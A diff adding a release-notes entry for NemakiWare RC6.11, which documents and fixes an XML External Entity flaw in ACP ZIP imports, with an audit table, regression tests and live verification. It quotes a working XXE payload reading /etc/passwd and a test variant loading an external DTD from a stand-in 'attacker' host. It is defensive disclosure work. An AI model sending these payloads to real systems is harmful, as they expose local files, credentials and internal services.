@@ -6,6 +6,166 @@ User-facing changelog. For per-commit detail see
 
 ---
 
+## 3.1.1-RC6.11 — Security: XXE on ACP import (CWE-611, GHSA, reporter tonghuaroot)
+_Release candidate on `release/3.1.1-RC6` (2026-05-31), branched
+off `v3.1.1-RC6.10` (`cf2f499f3`)._
+
+Seventh RC in the SSRF/XXE hardening cycle. **High-severity** XML
+External Entity vulnerability on the ACP (Alfresco Content Package)
+ZIP import path. Reported by tonghuaroot via GHSA — same reporter
+as the RC6.5 SSRF advisory.
+
+### The bug
+
+`jp.aegif.nemaki.rest.importexport.ZipImporter.importAcpFormat(...)`
+read the package XML (top-level `*.xml` entry inside an uploaded
+ACP ZIP) with a bare `new SAXReader()` (dom4j) that resolved
+DOCTYPE / SYSTEM / parameter entities by default. An
+authenticated non-admin user holding only `cmis:write` on a
+single target folder could upload a crafted ACP whose package
+XML contained:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root><folder><name>&xxe;</name></folder></root>
+```
+
+The resolved entity content was persisted **verbatim** into the
+created CMIS folder's `cmis:name` and was therefore recoverable
+through the product's own CMIS API — no out-of-band channel
+required.
+
+**Impact**:
+- Arbitrary local file read by an authenticated, non-administrative
+  user (demonstrated `/etc/passwd`, `/etc/hostname`; the same
+  primitive reads any path readable by the Tomcat process —
+  application config, credentials, key material, etc.).
+- Server-Side Request Forgery via SYSTEM / external parameter
+  entities targeting `http://internal-host/...`.
+
+**Privilege required**: standard content author (`cmis:write` on
+one folder via `applyACL`). Reproduced live with a non-admin
+`bob` user against the deployed `v3.1.1-RC6.10` stack before fix.
+
+### The fix
+
+`ZipImporter.importAcpFormat(...)` now configures the SAXReader
+exactly like the sibling `jp.aegif.nemaki.rest.TypeResource.parse(...)`
+(which had this guard since RC13):
+
+```java
+SAXReader reader = new SAXReader();
+try {
+    reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+    reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
+    reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+} catch (org.xml.sax.SAXException e) {
+    throw new DocumentException("Failed to configure XXE protection on SAXReader", e);
+}
+xmlDoc = reader.read(new ByteArrayInputStream(xmlData));
+```
+
+The DOCTYPE-bearing PoC now returns:
+```json
+{"documentsCreated":0,"foldersCreated":0,"message":"Import completed",
+ "errors":["Failed to parse package XML: ... DOCTYPE is disallowed when
+   the feature \"http://apache.org/xml/features/disallow-doctype-decl\"
+   set to true."],"status":"partial"}
+```
+
+Benign DOCTYPE-free ACP packages still import successfully.
+
+### Repo-wide audit (per reporter recommendation)
+
+Audited every `new SAXReader()` / `DocumentBuilderFactory.newInstance()`
+/ `XMLInputFactory` / `SAXParserFactory` in the codebase:
+
+| Sink | Status |
+|---|---|
+| `ZipImporter.java:191` | **Bug — fixed in this RC.** |
+| `TypeResource.java:1721` | Already hardened (since RC13). |
+| `AuthTokenResource.java:475` (SAML response parsing) | Already hardened — full 5 features incl. `FEATURE_SECURE_PROCESSING` + `ACCESS_EXTERNAL_DTD/SCHEMA` empty. |
+| `SolrResource.java:403`, `SolrAllResource.java:143` | Already hardened (since RC13). |
+| `SamlSignatureVerifier.java` | Receives a parsed `Document` from `AuthTokenResource`; does no XML parsing itself. |
+
+No other unhardened XML parser sinks found.
+
+### New regression test
+
+`core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java`
+(4 cases, JVM-level — no Tomcat needed):
+1. `rejectsDoctypeWithFileSystemEntity` — feeds the reporter's
+   exact `<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd">
+   ]>` payload, asserts `DocumentException` with "DOCTYPE is
+   disallowed" diagnostic.
+2. `rejectsDoctypeWithExternalParameterEntity` — blind/OOB variant
+   (`<!DOCTYPE root SYSTEM "http://attacker/evil.dtd">`),
+   asserts `DocumentException`.
+3. `acceptsBenignDoctypeFreePackageXml` — guards against over-block
+   regression; benign ACP shape must still parse cleanly.
+4. `hardenedReaderHasAllThreeFeaturesEnabled` — reads back the
+   three SAX feature values via `getXMLReader().getFeature(...)`
+   to pin the contract even if a future change reorders or drops
+   one of the `setFeature` calls.
+
+### Live verification
+
+Done against this session's RC6.10 stack:
+
+1. **Pre-fix reproduction** — created non-admin `bob`, granted
+   `cmis:write` on a fresh folder, uploaded `xxe_passwd.zip`,
+   server returned `foldersCreated: 1` and the container's
+   `/etc/passwd` content showed up verbatim as a CMIS folder
+   name in CouchDB.
+2. **Post-fix** (after deploying the patched WAR) — identical
+   upload returned the documented "DOCTYPE is disallowed"
+   error with `foldersCreated: 0`, `status: partial`.
+3. **Benign control** — DOCTYPE-free ACP zip imported with
+   `foldersCreated: 1`, `status: success`.
+4. **Test artifacts cleanup** — leaked-content folder + bob user
+   + parent folder + archive db copies all swept after
+   verification.
+
+### Tests
+
+- **`ZipImporterXxeTest`** (new): **4/4 PASS**.
+- **Focused 25-class regression** (24 from RC6.10 + new
+  `ZipImporterXxeTest`): **377/377 PASS** (was 373 in RC6.10;
+  +4 from new XXE test).
+- **SOC validator full run** (no Docker): **17 PASS / 7 SKIP**
+  including Phase 1.4.1 source-tree NUL scan (1683 source files
+  / 0 hits — was 1680 in RC6.10; +3 from `ZipImporterXxeTest`
+  and other small files).
+
+### Files touched (RC6.11)
+
+**Code (1 file)**:
+- `core/src/main/java/jp/aegif/nemaki/rest/importexport/ZipImporter.java`
+  — 3-feature hardening block added to the SAXReader configuration
+  in `importAcpFormat(...)`. Mirrors the existing TypeResource
+  pattern 1:1.
+
+**Tests (1 file)**:
+- `core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java`
+  (NEW, 4 cases).
+
+**Docs**: `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`.
+
+### Migration / compatibility
+
+No public API change. No new properties. No schema / patch / view
+/ Mango index changes. Existing legitimate ACP imports continue to
+work — only DOCTYPE-bearing payloads (which have no legitimate use
+in NemakiWare's ACP format) now fail with a clear diagnostic.
+
+### Credit
+
+Reported by **tonghuaroot** via GitHub Security Advisory. Same
+reporter as the RC6.5 SSRF advisory.
+
+---
+
 ## 3.1.1-RC6.10 — Refactor: extract SsrfGuard shared utility + source-tree NUL pre-commit scan
 _Release candidate on `release/3.1.1-RC6` (2026-05-31), branched
 off `v3.1.1-RC6.9` (`76695f46c`)._
